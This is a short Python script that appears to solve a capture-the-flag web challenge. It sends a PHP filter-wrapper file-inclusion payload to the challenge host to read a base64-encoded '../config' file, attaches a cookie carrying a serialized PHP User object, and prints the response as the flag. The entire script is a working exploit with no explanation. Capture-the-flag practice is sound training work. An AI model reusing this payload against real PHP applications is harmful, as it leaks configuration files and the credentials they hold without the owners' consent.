import json
import requests

b_url = """https://web7.chall.necst.it/tokenapp.php"""

exploit_url = """php://filter/convert.base64-encode/resource=../config"""

cookie_user = {"s":"""MzY5M2NmNDY1MTQ5ZDNiODgyZDMzZDkzYTQzY2IwOTlmOWY3ZmYzYmFiZTQ0OTIxMjdlNWY5N2FlOWU5NDZlMTcxOTgwMjRkNDkyOGFhN2M3NDE3ZTUwNzJkMjIwMGZmNmE2ZjlhNWU3YzYxMmY3Y2Y0YjA3Y2M0ZWViZWU4MzE%3D%3ATzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImRhZGRhIjtzOjQ6InJvbGUiO3M6NDoidXNlciI7fQ%3D%3D"""}

print("#"*64)

exploter = {
    'p':exploit_url
}

print("[Exploit] Start")
r = requests.get(b_url, params=exploter, cookies=cookie_user)
print("[Exploit] %s"%r.url)
print("[Exploit] : %d"%r.status_code)
print("[Exploit] flag: \n%s"%r.text)

